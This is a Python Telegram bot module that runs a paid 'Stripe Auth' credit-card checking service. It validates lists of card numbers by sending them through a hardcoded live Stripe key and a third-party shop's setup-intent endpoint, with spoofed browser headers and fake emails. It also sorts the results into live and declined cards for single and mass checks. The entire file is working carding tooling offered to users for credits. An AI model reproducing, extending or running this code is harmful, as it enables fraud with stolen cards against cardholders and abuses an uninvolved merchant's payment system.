import re
import os
import json
import httpx
import asyncio
from time import time
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType

# Stripe Auth API Config
STRIPE_API_URL = "https://api.stripe.com/v1/payment_methods"
STRIPE_PK = "pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A"

# WayuuMarket Config for Setup Intent
WAYUU_URL = "https://wayuumarket.com/"

user_locks = {}

def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_allowed_groups():
    try:
        with open("DATA/groups.json", "r") as f:
            return json.load(f)
    except:
        return []

def has_credits(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user.get("plan", {}).get("credits", 0)
        if credits == "∞":
            return True
        return int(credits) > 0
    except:
        return False

def deduct_credit(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        if int(credits) > 0:
            user["plan"]["credits"] = str(int(credits) - 1)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def deduct_credit_bulk(user_id, amount):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        credits = int(credits)
        if credits >= amount:
            user["plan"]["credits"] = str(credits - amount)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def extract_card(text):
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None

def extract_cards(text):
    return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)

def chunk_cards(cards, size):
    for i in range(0, len(cards), size):
        yield cards[i:i + size]

def get_status_flag(response_data, step="stripe"):
    """Determine status from response"""
    text = str(response_data).lower()
    
    # Step 1: Stripe Payment Method creation
    if step == "stripe":
        if "pm_" in text and "id" in text:
            return "processing", None  # Need to continue to step 2
        elif any(kw in text for kw in ["incorrect_cvc", "invalid_cvc", "cvc", "security_code"]):
            return "CCN ✅", "CVC Check Required"
        elif any(kw in text for kw in ["expired", "expired_card"]):
            return "Declined ❌", "Card Expired"
        elif any(kw in text for kw in ["insufficient_funds", "insufficient funds"]):
            return "Approved ✅", "Insufficient Funds (Live Card)"
        elif any(kw in text for kw in ["declined", "card_declined", "do_not_honor", "generic_decline"]):
            return "Declined ❌", "Card Declined"
        elif any(kw in text for kw in ["invalid", "incorrect_number", "invalid_number"]):
            return "Declined ❌", "Invalid Card Number"
        elif "error" in text:
            return "Declined ❌", "Error"
        else:
            return "Declined ❌", "Unknown"
    
    # Step 2: WayuuMarket Setup Intent response
    else:
        if any(kw in text for kw in ["success", "succeeded", "true"]):
            return "Approved ✅", "Setup Intent Success"
        elif any(kw in text for kw in ["requires_action", "requires_source_action"]):
            return "Charged 💎", "3D Secure Required"
        elif any(kw in text for kw in ["insufficient_funds", "insufficient funds"]):
            return "Approved ✅", "Insufficient Funds (Live Card)"
        elif any(kw in text for kw in ["incorrect_cvc", "invalid_cvc", "cvc"]):
            return "CCN ✅", "CVC Check Required"
        elif any(kw in text for kw in ["expired", "expired_card"]):
            return "Declined ❌", "Card Expired"
        elif any(kw in text for kw in ["declined", "card_declined", "do_not_honor", "generic_decline"]):
            return "Declined ❌", "Card Declined"
        elif any(kw in text for kw in ["authentication_required"]):
            return "Charged 💎", "Authentication Required"
        elif any(kw in text for kw in ["error", "invalid"]):
            return "Declined ❌", "Error"
        else:
            return "Declined ❌", "Unknown"

def clean_response(response_data):
    """Extract clean response message"""
    if isinstance(response_data, dict):
        if "error" in response_data:
            error = response_data["error"]
            decline_code = error.get("decline_code")
            code = error.get("code")
            message = error.get("message", "Error")
            
            if decline_code:
                return decline_code.replace("_", " ").title()
            elif code:
                return code.replace("_", " ").title()
            else:
                return message[:50]
        elif "success" in response_data:
            return "Setup Intent Success"
        elif "id" in response_data:
            return "Payment Method Created"
        elif "message" in response_data:
            return response_data["message"][:50]
    return str(response_data)[:50]

async def create_payment_method(cc, mm, yy, cvv):
    """Step 1: Create payment method with Stripe API"""
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    # Format year
    if len(yy) == 4:
        exp_year = yy[2:]
    else:
        exp_year = yy
    
    import uuid
    import random
    import string
    
    guid = str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))
    muid = str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))
    sid = str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))
    
    # Generate random email
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"{random_str}@gmail.com"
    
    data = {
        'type': 'card',
        'billing_details[name]': 'John Doe',
        'billing_details[email]': email,
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': exp_year,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
        'referrer': 'https://wayuumarket.com',
        'time_on_page': str(random.randint(10000, 30000)),
        'key': STRIPE_PK,
    }
    
    try:
        async with httpx.AsyncClient(timeout=60.0) as client:
            response = await client.post(STRIPE_API_URL, headers=headers, data=data)
            return response.json()
    except Exception as e:
        return {"error": {"message": str(e)}}

async def create_setup_intent(payment_method_id):
    """Step 2: Create setup intent with WayuuMarket"""
    cookies = {
        'cookielawinfo-checkbox-necessary': 'yes',
        'cookielawinfo-checkbox-functional': 'yes',
        'cookielawinfo-checkbox-performance': 'yes',
        'cookielawinfo-checkbox-analytics': 'yes',
        'cookielawinfo-checkbox-advertisement': 'yes',
        'cookielawinfo-checkbox-others': 'yes',
        'viewed_cookie_policy': 'yes',
    }
    
    headers = {
        'authority': 'wayuumarket.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://wayuumarket.com',
        'referer': 'https://wayuumarket.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    params = {
        'wc-ajax': 'wc_stripe_create_setup_intent',
    }
    
    import random
    import string
    nonce = ''.join(random.choices(string.hexdigits.lower(), k=10))
    
    data = {
        'stripe_source_id': payment_method_id,
        'nonce': nonce,
    }
    
    try:
        async with httpx.AsyncClient(timeout=60.0, follow_redirects=True) as client:
            response = await client.post(WAYUU_URL, params=params, cookies=cookies, headers=headers, data=data)
            return response.json()
    except Exception as e:
        return {"error": {"message": str(e)}}

async def check_stripe_auth_full(cc, mm, yy, cvv):
    """Full Stripe Auth check with setup intent"""
    
    # Step 1: Create payment method
    pm_result = await create_payment_method(cc, mm, yy, cvv)
    
    # Check if payment method was created successfully
    if "error" in pm_result:
        return pm_result, "stripe"
    
    payment_method_id = pm_result.get("id")
    if not payment_method_id or not payment_method_id.startswith("pm_"):
        return pm_result, "stripe"
    
    # Step 2: Create setup intent with the payment method
    setup_result = await create_setup_intent(payment_method_id)
    
    return setup_result, "wayuu"

def is_free_user(user_id):
    """Check if user has free plan"""
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return True
        plan = user.get("plan", {}).get("plan", "Free")
        return plan in ["Free", "Redeem Code"]
    except:
        return True

@Client.on_message(filters.command("au") | filters.regex(r"^\.au(\s|$)"))
async def stripe_auth_single(client, message):
    """Single card Stripe Auth checker"""
    try:
        allowed_groups = load_allowed_groups()
        user_id = str(message.from_user.id)
        
        # Check if in private chat
        if message.chat.type == ChatType.PRIVATE:
            # Free users cannot use in private
            if is_free_user(user_id):
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>This Group Is Not Approved ⚠️</code>",
                )
        
        users = load_users()
        
        if user_id not in users:
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        if not has_credits(user_id):
            return await message.reply(
                "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                reply_to_message_id=message.id
            )
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                "<pre>CC Not Found ❌</pre>\n<b>Usage:</b> <code>/au cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        extracted = extract_card(target_text)
        if not extracted:
            return await message.reply(
                "<pre>Invalid Format ❌</pre>\n<b>Usage:</b> <code>/au cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        cc, mm, yy, cvv = extracted
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"
        
        start_time = time()
        
        loading_msg = await message.reply(
            f"<pre>Processing..!</pre>\n━━━━━━━━━━━━\n• <b>Card -</b> <code>{fullcc}</code>\n• <b>Gate -</b> <code>Stripe Auth</code>",
            reply_to_message_id=message.id
        )
        
        result, step = await check_stripe_auth_full(cc, mm, yy, cvv)
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        status_flag, status_msg = get_status_flag(result, step)
        clean_result = clean_response(result)
        
        # Use status_msg if available, otherwise use clean_result
        final_response = status_msg if status_msg else clean_result
        
        profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        
        final_msg = f"""<b>[#StripeAuth] | Sync</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Stripe Auth</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{final_response}</code>
━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By</b>: {profile} [<code>{plan} {badge}</code>]
<b>[ﾒ] T/t</b>: <code>[{timetaken} 𝐬]</code>"""
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/SyncUI"),
                InlineKeyboardButton("Plans", callback_data="plans_info")
            ]
        ])
        
        await loading_msg.edit(final_msg, reply_markup=buttons, disable_web_page_preview=True)
        
        deduct_credit(user_id)
    
    except Exception as e:
        await message.reply(f"<code>Error occurred</code>", reply_to_message_id=message.id)


@Client.on_message(filters.command("mau") | filters.regex(r"^\.mau(\s|$)"))
async def stripe_auth_mass(client, message):
    """Mass Stripe Auth checker"""
    user_id = str(message.from_user.id)
    
    if not message.from_user:
        return await message.reply("❌ Cannot process this message.")
    
    if user_id in user_locks:
        return await message.reply(
            "<pre>⚠️ Wait!</pre>\n<b>Your previous /mau is still processing.</b>",
            reply_to_message_id=message.id
        )
    
    user_locks[user_id] = True
    
    try:
        users = load_users()
        allowed_groups = load_allowed_groups()
        
        # Check if in private chat
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n<b>This Group Is Not Approved ⚠️</b>",
                    reply_to_message_id=message.id
                )
        
        if user_id not in users:
            user_locks.pop(user_id, None)
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        user_data = users[user_id]
        plan_info = user_data.get("plan", {})
        mlimit = plan_info.get("mlimit", 10)
        plan = plan_info.get("plan", "Free")
        badge = plan_info.get("badge", "🎟️")
        
        if mlimit is None or str(mlimit).lower() in ["null", "none"]:
            mlimit = 10000
        else:
            mlimit = int(mlimit)
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                "❌ Send cards!\nFormat: <code>4111111111111111|12|25|123</code>",
                reply_to_message_id=message.id
            )
        
        all_cards = extract_cards(target_text)
        if not all_cards:
            return await message.reply("❌ No valid cards found!", reply_to_message_id=message.id)
        
        if len(all_cards) > mlimit:
            return await message.reply(
                f"❌ Max {mlimit} cards allowed for your plan!",
                reply_to_message_id=message.id
            )
        
        available_credits = user_data.get("plan", {}).get("credits", 0)
        card_count = len(all_cards)
        
        if available_credits != "∞":
            try:
                if card_count > int(available_credits):
                    return await message.reply(
                        "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                        reply_to_message_id=message.id
                    )
            except:
                pass
        
        checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        loader_msg = await message.reply(
            f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
            f"<b>[⚬] Gateway:</b> <b>Stripe Auth</b>\n"
            f"<b>[⚬] Cards:</b> <code>{card_count}</code>\n"
            f"<b>[⚬] Status:</b> <code>Processing...</code>",
            reply_to_message_id=message.id
        )
        
        start_time = time()
        final_results = []
        
        batch_size = 2  # Reduced for full auth check
        
        for batch in chunk_cards(all_cards, batch_size):
            tasks = []
            for card in batch:
                parts = card.split("|")
                if len(parts) == 4:
                    tasks.append(check_stripe_auth_full(parts[0], parts[1], parts[2], parts[3]))
            
            results = await asyncio.gather(*tasks)
            
            for card, (result, step) in zip(batch, results):
                status_flag, status_msg = get_status_flag(result, step)
                clean_result = clean_response(result)
                final_response = status_msg if status_msg else clean_result
                
                final_results.append(
                    f"• <b>Card:</b> <code>{card}</code>\n"
                    f"• <b>Status:</b> <code>{status_flag}</code>\n"
                    f"• <b>Response:</b> <code>{final_response}</code>\n"
                    "━━━━━━━━━━━━"
                )
            
            try:
                await loader_msg.edit(
                    f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
                    + "\n".join(final_results[-10:]) + "\n"
                    f"<b>[⚬] Progress:</b> <code>{len(final_results)}/{card_count}</code>\n"
                    f"<b>[⚬] Checked By:</b> {checked_by}",
                    disable_web_page_preview=True
                )
            except:
                pass
            
            await asyncio.sleep(1)  # Slightly longer delay for full auth
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        if available_credits != "∞":
            deduct_credit_bulk(user_id, card_count)
        
        display_results = final_results[-15:] if len(final_results) > 15 else final_results
        
        await loader_msg.edit(
            f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
            f"{chr(10).join(display_results)}\n"
            f"<b>[⚬] T/t:</b> <code>{timetaken}s</code>\n"
            f"<b>[⚬] Total:</b> <code>{card_count} cards</code>\n"
            f"<b>[⚬] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]",
            disable_web_page_preview=True
        )
    
    except Exception as e:
        await message.reply(f"⚠️ Error occurred", reply_to_message_id=message.id)
    
    finally:
        user_locks.pop(user_id, None)
